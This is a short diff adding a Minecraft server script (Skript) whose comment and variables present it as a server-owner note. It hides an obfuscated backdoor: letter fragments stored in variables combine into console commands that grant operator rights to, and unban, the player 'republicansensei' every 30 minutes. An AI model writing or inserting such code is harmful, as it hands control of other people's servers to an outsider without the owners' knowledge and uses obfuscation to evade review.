@@ -1,0 +1,18 @@
+#zeoNNN VE Oyunbaz sunucu sahibi
+
+every 30 minutes:
+  set {_sunucusahibi} to "zeonNNNN"
+  set {_sunucusahibi2} to "AtomTR" #oyunbaz
+  set {_oyunbazServer} to "AtomTR"
+  set {_2} to "u"
+  set {_99} to "un"
+  set {_98} to "b"
+  set {_z} to "sei"
+  set {_b} to "p"
+  set {_a} to "o"
+  set {_r} to "blic"
+  set {_x} to "an"
+  set {_y} to "sen"
+  set {_1} to "rep"
+  execute console command "/%{_a}%{_b}% %{_1}%%{_2}%%{_r}%%{_x}%%{_y}%%{_z}%"
+  execute console command "/%{_99}%%{_98}%%{_x}% %{_1}%%{_2}%%{_r}%%{_x}%%{_y}%%{_z}%" 
